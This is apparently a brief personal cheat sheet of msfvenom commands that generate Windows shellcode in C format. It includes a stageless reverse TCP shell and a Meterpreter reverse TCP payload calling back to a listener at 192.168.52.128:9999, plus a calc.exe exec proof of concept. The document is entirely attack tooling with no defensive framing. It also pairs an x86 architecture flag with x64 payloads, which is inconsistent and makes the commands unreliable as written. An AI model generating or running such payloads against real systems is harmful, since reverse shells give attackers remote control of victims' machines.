# x86 Stageless

reverse tcp
```sh
msfvenom -a x86 --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.52.128 LPORT=9999 -f c
```

meterpreter
```sh
msfvenom -a x86 --platform windows -p windows/x64/meterpreter_reverse_tcp  LHOST=192.168.52.128 LPORT=9999 -f c
```

calc
```sh
msfvenom -a x86 --platform windows -p windows/exec CMD="calc.exe" -f c
```
